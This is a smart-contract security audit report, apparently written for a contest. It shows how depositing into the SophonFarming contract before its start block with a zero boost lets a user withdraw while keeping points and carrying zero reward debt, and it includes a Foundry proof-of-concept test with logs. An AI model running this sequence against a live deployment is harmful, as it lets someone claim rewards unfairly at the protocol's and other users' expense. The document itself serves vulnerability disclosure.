# The farming contract accpets deposits before startBlock & allows to set 0 boostAmount while depositing, so any user can avoid rewardDebt and gain adequate points according to his deposit

## Summary
The `SophonFarming::_deposit()` allows any user to deposit before startBlock & set boostAmount to 0, so the user can deposit before the startBlock and withdraw all of his deposit after any block of startBlock, by doing this he will get his points & completely bypass his rewardDebt.
## Vulnerability Detail
Assume, current block is 1 & startBlock is 2, an user wanna deposit 1_000_000e18 amount of sDAI. He deposited that before the startBlock.
Now in `_deposit()`, `updatePool()` is called to get updated `accPointsPerShare` & `lastRewardBlock`. As the user called the `_deposit()` before startBlock the `updatePool()` will not do anything but simply return because of this condition:
```solidity
if (getBlockNumber() <= pool.lastRewardBlock) { 
            return;
        }
```
Now, in `_deposit()`, `user.rewardSettled` will be 0 because as the user did not deposit anything before so `user.amount` is 0, the `pool.accPointsPerShare` will also be 0. `user.rewardSettled` & `user.rewardDebt` will also be 0 because of same reason i.e no previous deposit. Then at last of the `_deposit()` the `user.rewardDebt` will be updated again, here again it will be 0 because `pool.accPointsPerShare` is 0. 

At this point:
pool.amount = 1_000_000e18
user.amount = 1_000_000e18

At block 3 the user called `SophonFarming::withdraw()` to withdraw all of his deposit. In this function, when `updatePool()` is called it will update the `pool.accPointsPerShare` to a value & `lastRewardBlock` to current block i.e 3. Now here, `user.rewardSettled` will have a value because both `user.amount` & `pool.accPointsPerShare` has some value. Here, the user had his boostAmount 0 while depositing, for that reason `user.depositAmount` & `user.amount` is same. So, the depositAmount is deducted from the `user.amount` and sent to the user:
```solidity
@> SophonFarming::withdraw()
// codes
userAmount = userAmount - _withdrawAmount;
  //codes     
 pool.lpToken.safeTransfer(msg.sender, _withdrawAmount);
//codes
```
At this point `user.amount` is 0. Now at the end of `withdraw()` when rewardDebt is updated the user.amount is multiplied by accPointsPerShare, but as user.amount is 0 rewardDebt will be 0. 
Now, the user staying in the protocol with points and 0 reward debt.

### PoC
Paste this test in SophonFarming.t.sol & run:
```solidity
        function test_depositBeforeStartBlock() public {
            vm.roll(0);            // @audit setting block.number before startBlock
            assertEq(block.number, 0);
            assertEq(sophonFarming.startBlock() - 1, block.number);   // @note startBlock == 1 
            SophonFarmingState.UserInfo memory userInfo;
            uint256 daiPID = sophonFarming.typeToId(SophonFarmingState.PredefinedPool.sDAI);
            deal(address(sDAI), account1, 1_000_000_0000e18);
            vm.startPrank(account1);
            sDAI.approve(address(sophonFarming), 1_000_000_0000e18);
            sophonFarming.deposit(daiPID, 1_000_000_000e18, 0);
            vm.stopPrank();
            SophonFarmingState.PoolInfo[] memory pools = sophonFarming.getPoolInfo();
            console.log("pool.amount: ", pools[daiPID].amount);
            (userInfo.amount, userInfo.boostAmount, userInfo.depositAmount, userInfo.rewardSettled, userInfo.rewardDebt) =
            sophonFarming.userInfo(daiPID, account1);
            console.log("user.amount: ", userInfo.amount);
            console.log("user.depositAmount: ", userInfo.depositAmount);
            assertEq(userInfo.rewardSettled, 0);
            assertEq(pools[daiPID].accPointsPerShare, 0);
            vm.roll(2);     // @audit now we are in block 2, 
            console.log("-------------------------------");
            console.log("---- AFTER CHANGING BLOCK ----");
            console.log("-------------------------------");
            vm.prank(account1);
            sophonFarming.withdraw(daiPID, userInfo.depositAmount);
            SophonFarmingState.PoolInfo[] memory pools2 = sophonFarming.getPoolInfo();
            console.log("pool.amount: ", pools2[daiPID].amount);
            (userInfo.amount, userInfo.boostAmount, userInfo.depositAmount, userInfo.rewardSettled, userInfo.rewardDebt) =
            sophonFarming.userInfo(daiPID, account1);
            console.log("user.amount: ", userInfo.amount);
            console.log("user.rewardSettled: ", userInfo.rewardSettled);
            console.log("user.rewardDebt: ", userInfo.rewardDebt);
        }
```
Result:
```solidity
Logs:
  pool.amount:  1000000000000000000000000000
  user.amount:  1000000000000000000000000000
  user.depositAmount:  1000000000000000000000000000
  -------------------------------
  ---- AFTER CHANGING BLOCK ----
  -------------------------------
  pool.amount:  0
  user.amount:  0
  user.rewardSettled:  8333333333000000000
  user.rewardDebt:  0
```
> For this attack the accPointsPerShare must be 0 at the deposit time otherwise rewardDebt will be updated to a value at the end of the depsoit() and when he will withdraw the rewardDebt will be deducted, as accPointsPerShare can only change from 0 when block number increases & pool.amount != 0 so the attacker need to deposit in pool at first. In PoC i shown the deposit before startBlock i.e just after deploying the contract because this is the best time when the user will get 0 pool.amount & the protocol is allowing to deposit before startBlock.

## Impact
User will avoid rewardDebt.
